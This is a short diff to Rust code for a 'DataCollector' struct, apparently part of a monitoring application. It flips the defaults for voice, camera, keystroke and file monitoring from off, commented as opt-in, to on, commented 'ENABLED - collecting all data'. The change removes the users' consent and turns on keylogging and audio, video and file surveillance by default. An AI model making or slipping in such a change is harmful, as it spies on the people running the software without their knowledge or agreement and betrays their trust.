@@ -52,10 +52,10 @@ impl DataCollector {
             focus_state_history: VecDeque::with_capacity(10000),
             _last_system_event: None,
             _file_access_cache: std::collections::HashMap::new(),
-            voice_enabled: false,     // opt-in
-            camera_enabled: false,    // opt-in
-            keystroke_enabled: false, // opt-in
-            file_monitoring_enabled: false, // opt-in
+            voice_enabled: true,     // ENABLED - collecting all data
+            camera_enabled: true,    // ENABLED - collecting all data
+            keystroke_enabled: true, // ENABLED - collecting all data
+            file_monitoring_enabled: true, // ENABLED - collecting all data
         }
     }
     
